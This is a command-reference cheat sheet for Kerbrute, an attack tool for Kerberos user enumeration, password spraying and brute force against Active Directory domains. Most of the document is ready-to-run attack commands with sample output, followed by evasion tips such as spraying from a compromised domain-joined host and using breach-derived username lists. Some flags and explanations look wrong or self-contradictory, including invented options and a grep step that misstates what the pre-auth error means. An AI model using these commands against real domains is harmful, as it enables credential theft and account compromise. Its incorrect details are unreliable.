# <span style="color:rgb(255, 192, 0)">Kerbrute - Complete Command Reference</span>

Kerbrute by @ropnop is a Go tool for performing Kerberos pre-authentication attacks including user enumeration, password spraying, and brute force. It uses Kerberos directly with no need for SMB or other protocols.

**Installation:**
```bash
# Download binary
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# From source (Go)
go install github.com/ropnop/kerbrute@latest

# Kali
sudo apt install kerbrute
```

---

## <span style="color:rgb(255, 0, 0)">1. User Enumeration</span>

Kerbrute sends TGT requests to the KDC. If a user exists, the response differs from a non-existent user (typically KDC_ERR_PREAUTH_REQUIRED vs KDC_ERR_C_PRINCIPAL_UNKNOWN).

```bash
# Enumerate users from file
kerbrute userenum users.txt -d domain.local

# Enumerate with domain controller
kerbrute userenum users.txt -d domain.local --dc 10.0.0.1

# Verbose output
kerbrute userenum users.txt -d domain.local -v

# No save output
kerbrute userenum users.txt -d domain.local --dont-save-output

# Output to file
kerbrute userenum users.txt -d domain.local -o valid_users.txt

# Domain joined mode (use current domain)
kerbrute userenum users.txt

# With custom domain controller IP
kerbrute userenum users.txt -d domain.local --dc dc01.domain.local

# Incremental mode (slow but stealthier)
kerbrute userenum users.txt -d domain.local --incremental

# Delay between requests (ms)
kerbrute userenum users.txt -d domain.local --delay 1000

# Jitter (random delay)
kerbrute userenum users.txt -d domain.local --jitter 500

# Timeout
kerbrute userenum users.txt -d domain.local --timeout 5

# Number of goroutines (concurrent)
kerbrute userenum users.txt -d domain.local --threads 10

# Show statistics
kerbrute userenum users.txt -d domain.local -v --stats

# Quiet mode
kerbrute userenum users.txt -d domain.local -q
```

### How User Enum Works

```
AS-REQ for existing user with pre-auth:
  → KDC_ERR_PREAUTH_REQUIRED (user exists, needs pre-auth)
  
AS-REQ for non-existing user:
  → KDC_ERR_C_PRINCIPAL_UNKNOWN (user doesn't exist)

AS-REQ for existing user without pre-auth (AS-REP roastable):
  → AS-REP returned (user exists, can AS-REP roast)
```

### User Enum Results

```
$ kerbrute userenum users.txt -d domain.local

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/15/26
Using KDC: dc01.domain.local:88

[+] VALID USER:   administrator@domain.local
[+] VALID USER:   jdoe@domain.local
[+] VALID USER:   svc_sql@domain.local
[+] VALID USER:   backup_user@domain.local
[-] USER NOT FOUND: nonexistent@domain.local
[+] VALID USER:   sql_svc@domain.local

Done! Tested 10 usernames in 1.234 seconds: 5 valid, 1 not found, 4 errors
```

---

## <span style="color:rgb(0, 176, 240)">2. Password Spraying</span>

Password spraying tests a single password against many users (NOT brute force).

```bash
# Single password against multiple users
kerbrute passwordspray users.txt Password123 -d domain.local

# With specific DC
kerbrute passwordspray users.txt 'Summer2026!' -d domain.local --dc 10.0.0.1

# Output to file
kerbrute passwordspray users.txt 'Password123' -d domain.local -o valid_creds.txt

# Incremental mode (space requests out)
kerbrute passwordspray users.txt 'Password123' -d domain.local --incremental

# Delay
kerbrute passwordspray users.txt 'Password123' -d domain.local --delay 500

# Verbose
kerbrute passwordspray users.txt 'Password123' -d domain.local -v

# Quiet (show only valid)
kerbrute passwordspray users.txt 'Password123' -d domain.local -q

# Show all attempts
kerbrute passwordspray users.txt 'Password123' -d domain.local --show-all

# Automatic (incremental mode for safety - avoids lockout)
kerbrute passwordspray users.txt 'Password123' -d domain.local --auto

# Custom number of concurrent goroutines
kerbrute passwordspray users.txt 'Password123' -d domain.local --threads 5
```

### Safety Recommendations

```bash
# 1. Always use --delay/-d to space requests (avoid lockout)
kerbrute passwordspray users.txt 'Pass123' -d domain.local --delay 3000

# 2. Use incremental mode for even spacing
kerbrute passwordspray users.txt 'Pass123' -d domain.local --incremental

# 3. Only spray once per password per user (account lockout threshold)
# Domain default is typically 10 attempts before lockout

# 4. Use known valid users from enumeration
kerbrute passwordspray valid_users.txt 'Summer2026' -d domain.local --delay 5000
```

---

## <span style="color:rgb(146, 208, 80)">3. Brute Force</span>

Tests multiple passwords against a single user.

```bash
# Brute force single user
kerbrute bruteuser passwords.txt Administrator -d domain.local

# With DC
kerbrute bruteuser passwords.txt jdoe -d domain.local --dc 10.0.0.1

# Output to file
kerbrute bruteuser passwords.txt svc_account -d domain.local -o found_password.txt

# Incremental
kerbrute bruteuser passwords.txt user -d domain.local --incremental

# Delay
kerbrute bruteuser passwords.txt user -d domain.local --delay 1000

# Verbose
kerbrute bruteuser passwords.txt user -d domain.local -v

# Warning: Very noisy and likely to lock out accounts!
# Use only against service accounts or known low-lockout accounts
```

---

## <span style="color:rgb(255, 0, 0)">4. AS-REP Roasting Check</span>

```bash
# User enumeration also identifies AS-REP roastable users
kerbrute userenum users.txt -d domain.local

# If a user returns AS-REP (not KDC_ERR_PREAUTH_REQUIRED), they're AS-REP roastable
# Use GetNPUsers.py or Rubeus for actual hash extraction:
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1
```

---

## <span style="color:rgb(0, 176, 240)">5. Global Options Reference</span>

```bash
# General
-d, --domain DOM        Domain to authenticate against
--dc IP                 Domain controller IP/hostname
--dc-host HOST          Domain controller hostname (for Kerberos)
-o, --output FILE       Output file for valid results
-v, --verbose           Verbose output
-q, --quiet             Quiet output (valid results only)

# Timing
--delay MS              Delay between requests (milliseconds)
--jitter MS             Random jitter (milliseconds)
--incremental           Space requests evenly over time
--timeout SEC           Request timeout (default 5)

# Performance
--threads N             Number of concurrent goroutines (default 2)

# Output
--show-all              Show all results (not just valid)
--dont-save-output      Don't save output to file
--stats                 Show statistics at end

# Misc
--safe                  Use safe defaults (incremental + jitter)
-h, --help              Show help
```

---

## <span style="color:rgb(146, 208, 80)">6. OPSEC Considerations</span>

```yaml
Kerberos Traffic:
  - Kerbrute sends AS-REQ messages to KDC (port 88)
  - Each request is a standard Kerberos pre-auth request
  - No SMB, LDAP, or other protocol traffic
  - Encrypted (but not authenticated) traffic
  
Detection:
  - Event ID 4768: Kerberos authentication ticket (TGT) requested
  - Failed attempts: Event ID 4771 (Kerberos pre-auth failed)
  - Account lockout: Event ID 4740 (account locked out)
  - High volume of AS-REQ from one IP is suspicious
  - Unusual timing patterns (pulses of requests)
  
  Defensive measures:
  - Watch for unusual KDC_ERR_C_PRINCIPAL_UNKNOWN patterns
  - Monitor for high rate of Event ID 4768/4771 per source IP
  - Enable Kerberos armoring (FAST) to prevent enumeration
  - Remove service IDs from default sensitivity
  
Evasion:
  - Use --delay and --jitter to spread requests
  - Use --incremental to simulate natural timing
  - Use --threads 1 for maximum stealth
  - Run from compromised domain-joined system (traffic blends)
  - Avoid spraying non-existent users (noise)
  - Use valid user names (found through other recon)
```

---

## <span style="color:rgb(255, 0, 0)">7. Common Workflows</span>

### Full Pre-Attack Recon

```bash
# 1. Generate username list
# Use common patterns (first.last, flast, firstl, etc.)
# Or use known lists from breach data

# 2. Enumerate valid users
kerbrute userenum names.txt -d domain.local --dc 10.0.0.1 -o valid_users.txt

# 3. Identify AS-REP roastable users (from userenum output)
grep "KDC_ERR_PREAUTH" kerbrute.log  # Users NOT requiring pre-auth
# These users can be AS-REP roasted

# 4. Password spray against valid users
kerbrute passwordspray valid_users.txt 'Season2026!' -d domain.local --delay 3000 --incremental

# 5. Try common passwords
for pass in $(cat common_passwords.txt); do
  kerbrute passwordspray valid_users.txt "$pass" -d domain.local --delay 2000
done
```

### Speed vs Stealth Options

```bash
# Maximum speed (noisy, use caution)
kerbrute userenum users.txt -d domain.local --threads 50

# Balanced
kerbrute userenum users.txt -d domain.local --threads 10 --delay 100

# Stealth
kerbrute userenum users.txt -d domain.local --threads 2 --delay 2000 --jitter 1000

# Maximum stealth
kerbrute userenum users.txt -d domain.local --threads 1 --incremental --delay 5000
```
